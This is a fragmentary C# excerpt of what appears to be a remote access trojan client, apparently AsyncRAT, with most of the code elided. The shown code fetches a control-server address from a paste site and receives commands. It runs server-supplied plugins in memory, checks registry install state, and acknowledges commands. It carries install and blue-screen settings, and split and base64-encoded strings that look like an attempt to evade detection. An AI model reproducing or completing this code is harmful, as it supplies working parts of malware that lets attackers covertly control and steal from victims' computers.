    ...
    public static class ClientSocket
    {
            ...
            try
            {
                ...
                else
                {
                    using (var wc = new WebClient())
                    {
                        ...
                        var resp = wc.DownloadString(Settings.Paste_bin);
            ...
            try
            {
                ...
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    ...
                    case "plu_gin": // run plugin in memory
                    {
                        try
                        {
                            if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) ==
                                null) // check if plugin is installed
                            {
        ...
        private static void Invoke(MsgPack unpack_msgpack)
        {
            ...
            instance.Run(TcpClient, Settings.Server_Certificate, Settings.Hw_id,
                ...
                Settings.BS_OD, Settings.In_stall);
            Received();
        }
        ...
        private static void Received() //reset client forecolor
        {
            ...
            msgpack.ForcePathObject("Pac_ket").AsString =
                Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ=")); //"Received"
            Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }
